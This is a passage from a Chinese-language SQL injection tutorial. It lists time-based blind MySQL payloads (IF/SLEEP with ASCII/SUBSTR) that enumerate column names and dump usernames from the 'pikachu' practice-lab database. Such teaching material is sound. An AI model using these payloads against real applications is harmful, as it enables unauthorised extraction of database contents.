' AND IF((SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1) = 2, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中第一个字段名的字节长度

```
' AND IF((SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1) = 2, SLEEP(3), 1) -- 
```

判断指定数据库中指定数据表中第一个字段名的第一个字符

```
' AND  IF(ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中第一个字段名的第一个字符

```
' AND  IF(ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
```

### 8.5. Dump

判断指定数据库中指定数据表中指定字段中数据的个数

```
' AND IF((SELECT COUNT(*) FROM pikachu.users) = 3, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中指定字段中数据的个数

```
' AND IF((SELECT COUNT(*) FROM users) = 3, SLEEP(3), 1) -- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' AND IF((SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1) = 5, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' AND IF((SELECT LENGTH(username) FROM users LIMIT 0, 1) = 5, SLEEP(3), 1) -- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' AND IF(ASCII (SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1)) = 97, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' AND IF(ASCII (SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1)) = 97, SLEEP(3), 1) -- 
```

---

References

- [SQL injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-89)
